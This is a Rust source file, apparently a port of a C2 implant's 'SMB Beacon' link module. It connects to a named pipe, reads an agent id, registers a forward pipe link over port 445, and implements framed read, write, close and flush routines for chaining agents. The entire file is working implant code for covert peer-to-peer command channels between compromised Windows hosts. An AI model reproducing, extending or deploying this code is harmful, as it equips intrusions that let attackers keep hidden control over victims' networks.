//! Port of src/link_smb.cpp — SMB (named pipe) link channel.
//!
//! `link_start` connects to a named pipe (impersonation, message read mode),
//! reads the agent id, and registers the channel as a forward pipe link.
//! `read_all`/`write_all` are the raw pipe primitives; the `link_channel_smb_*`
//! functions implement the `LCHANNEL` function-pointer contract (frame header
//! + payload framing) over a pipe handle.

use crate::beacon::SETTING_SMB_FRAME_HEADER;
use crate::callback::{post_error_d, post_error_na, Callback};
use crate::link::{link_frame_header, link_register, LChannel};
use std::ffi::c_void;
use windows_sys::Win32::Foundation::{
    CloseHandle, GetLastError, ERROR_PIPE_BUSY, ERROR_SEM_TIMEOUT, GENERIC_READ, GENERIC_WRITE, HANDLE,
    INVALID_HANDLE_VALUE,
};
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileA, FlushFileBuffers, OPEN_EXISTING, ReadFile, SECURITY_ANONYMOUS, SECURITY_SQOS_PRESENT, WriteFile,
};
use windows_sys::Win32::System::Pipes::{
    DisconnectNamedPipe, PeekNamedPipe, PIPE_READMODE_MESSAGE, SetNamedPipeHandleState, WaitNamedPipeA,
};
use windows_sys::Win32::System::SystemInformation::GetTickCount;

/// Poll our pipe and see if it's ready to be read from (is_ready).
fn is_ready(my_pipe: isize, timeout: i32) -> bool {
    let until = unsafe { GetTickCount().wrapping_add(timeout as u32) };
    unsafe {
        while GetTickCount() < until {
            let mut avail: u32 = 0;
            if PeekNamedPipe(my_pipe as HANDLE, std::ptr::null_mut(), 0, std::ptr::null_mut(), &mut avail, std::ptr::null_mut())
                == 0
            {
                return false;
            }
            if avail > 0 {
                return true;
            }
            std::thread::sleep(std::time::Duration::from_millis(10));
        }
    }
    false
}

/// Attempt to connect to a named pipe (link_start).
pub fn link_start(pipename: &[u8], cb: Callback) {
    let mut name = pipename.to_vec();
    if !name.ends_with(&[0]) {
        name.push(0);
    }

    let stopat = unsafe { GetTickCount().wrapping_add(15000) };
    let mut pipe: HANDLE = INVALID_HANDLE_VALUE;

    // Connect to our pipe.
    unsafe {
        while GetTickCount() < stopat {
            pipe = CreateFileA(
                name.as_ptr() as *const u8,
                (GENERIC_READ | GENERIC_WRITE) as u32,
                0,
                std::ptr::null(),
                OPEN_EXISTING as u32,
                (SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS) as u32,
                std::ptr::null_mut(),
            );

            // Are we good to go?!? rock!
            if pipe != INVALID_HANDLE_VALUE {
                break;
            }

            // Punt... not going to work.
            if GetLastError() == ERROR_PIPE_BUSY {
                WaitNamedPipeA(name.as_ptr() as *const u8, 10000);
            } else {
                std::thread::sleep(std::time::Duration::from_millis(1000));
            }
        }
    }

    // Post the right error, if we didn't succeed.
    if pipe == INVALID_HANDLE_VALUE {
        let err = unsafe { GetLastError() };
        if err == ERROR_SEM_TIMEOUT {
            post_error_na(0x04);
        } else {
            post_error_d(0x14, err as i32);
        }
        return;
    }

    // Congrats.. we're connected. Now, we need to read an agent id.
    let mode: u32 = PIPE_READMODE_MESSAGE;
    let status = unsafe { SetNamedPipeHandleState(pipe, &mode, std::ptr::null(), std::ptr::null()) };
    if status == 0 {
        post_error_d(0x14, unsafe { GetLastError() } as i32);
        // Cleanup, because we failed.
        unsafe {
            DisconnectNamedPipe(pipe);
            CloseHandle(pipe);
        }
        return;
    }

    // Try to register our channel as a new link.
    if link_register(lchannel_smb(pipe as isize), crate::link::channel_forward_pipe(445), cb) {
        return;
    }

    unsafe {
        DisconnectNamedPipe(pipe);
        CloseHandle(pipe);
    }
}

/// Establish a connection to a Beacon (provide the whole pipe in the
/// parameter, please) (command_link_start_explicit).
pub fn command_link_start_explicit(buffer: &[u8], length: usize, cb: Callback) {
    let name = &buffer[..length.min(buffer.len())];
    link_start(name, cb);
}

/// Primitive for a single read (read_all). Returns the number of bytes read,
/// or -1 on failure.
pub fn read_all(pipe: isize, buffer: &mut [u8], get: usize) -> i32 {
    let mut total = 0usize;
    unsafe {
        // Get it in pieces if we need to.
        while total < get {
            let mut read: u32 = 0;
            let status = ReadFile(
                pipe as HANDLE,
                buffer[total..].as_mut_ptr(),
                (get - total) as u32,
                &mut read,
                std::ptr::null_mut(),
            );

            // Check it.
            if status == 0 || read == 0 {
                return -1;
            }

            // NOTE: ReadFile can return FALSE and GetLastError() ==
            // ERROR_MORE_DATA when nNumberOfBytesToRead is < the overall
            // message size. This is a characteristic of named pipes in read
            // message mode. We don't check the error as we always know the
            // size of our frames and are reading a value that is greater
            // than or equal to the size of an individual write message.

            // Increment our total.
            total += read as usize;
        }
    }

    // We came up short on our read. This is protocol breaking and an error.
    if total != get {
        return -1;
    }
    total as i32
}

/// Write a frame, remember the contract: TRUE = success, FALSE = failed
/// (write_all). Writes in 8K chunks.
pub fn write_all(pipe: isize, buffer: &[u8]) -> bool {
    let size = buffer.len();
    let mut wrote = 0usize;
    unsafe {
        while wrote < size {
            let chunk = (size - wrote).min(8192);
            let mut temp: u32 = 0;
            let status = WriteFile(
                pipe as HANDLE,
                buffer[wrote..].as_ptr(),
                chunk as u32,
                &mut temp,
                std::ptr::null_mut(),
            );

            // Check that it didn't fail.
            if status == 0 {
                return false;
            }

            // Keep trying.
            wrote += temp as usize;
        }
    }
    true
}

/// Implement our SMB Beacon module (link_channel_smb_read).
unsafe extern "C" fn link_channel_smb_read(thisp: *mut c_void, buffer: *mut u8, max: usize) -> i32 {
    let inst = thisp as *const LChannel;
    let pipe = (*inst).pipe;

    // Read our length into a pro-forma frame.
    let mut flen = 0usize;
    let mut frame = link_frame_header(SETTING_SMB_FRAME_HEADER as i32, 0, &mut flen);
    if flen < 4 {
        return -1;
    }
    let rlen = read_all(pipe, &mut frame, flen);
    if rlen == -1 || rlen as usize != flen {
        return -1;
    }

    // Extract our length value (raw host-order int).
    let get = i32::from_ne_bytes(frame[flen - 4..flen].try_into().unwrap());

    // Sanity check our get value.
    if get > max as i32 || get < 0 {
        return -1;
    }
    if get == 0 {
        return 0;
    }
    let out = std::slice::from_raw_parts_mut(buffer, get as usize);
    read_all(pipe, out, get as usize)
}

/// Write a frame via the SMB channel (link_channel_smb_write).
unsafe extern "C" fn link_channel_smb_write(thisp: *mut c_void, buffer: *const u8, length: usize) -> i32 {
    let inst = thisp as *const LChannel;
    let pipe = (*inst).pipe;

    // Build and write our frame header.
    let mut flen = 0usize;
    let frame = link_frame_header(SETTING_SMB_FRAME_HEADER as i32, length as i32, &mut flen);
    if !write_all(pipe, &frame) {
        return 0;
    }

    // Write the entire package.
    let payload = if length == 0 {
        &[]
    } else {
        std::slice::from_raw_parts(buffer, length)
    };
    if write_all(pipe, payload) {
        1
    } else {
        0
    }
}

/// Close the SMB channel (link_channel_smb_close).
unsafe extern "C" fn link_channel_smb_close(thisp: *mut c_void) {
    let inst = thisp as *const LChannel;
    let pipe = (*inst).pipe;
    DisconnectNamedPipe(pipe as HANDLE);
    CloseHandle(pipe as HANDLE);
}

/// Flush the SMB channel (link_channel_smb_flush).
unsafe extern "C" fn link_channel_smb_flush(thisp: *mut c_void) {
    let inst = thisp as *const LChannel;
    FlushFileBuffers((*inst).pipe as HANDLE);
}

/// Poll the SMB channel for readability (link_channel_smb_ready).
unsafe extern "C" fn link_channel_smb_ready(thisp: *mut c_void, timeout: i32) -> i32 {
    let inst = thisp as *const LChannel;
    if is_ready((*inst).pipe, timeout) {
        1
    } else {
        0
    }
}

/// Do nothing (link_channel_smb_nop).
unsafe extern "C" fn link_channel_smb_nop(_thisp: *mut c_void) {
    /* do nothing */
}

/// Initialize an SMB link channel (lchannel_smb).
pub fn lchannel_smb(pipe: isize) -> LChannel {
    LChannel {
        pipe,
        socket: 0,
        read: Some(link_channel_smb_read),
        write: Some(link_channel_smb_write),
        close: Some(link_channel_smb_close),
        flush: Some(link_channel_smb_flush),
        ready: Some(link_channel_smb_ready),
        wait: Some(link_channel_smb_nop),
    }
}
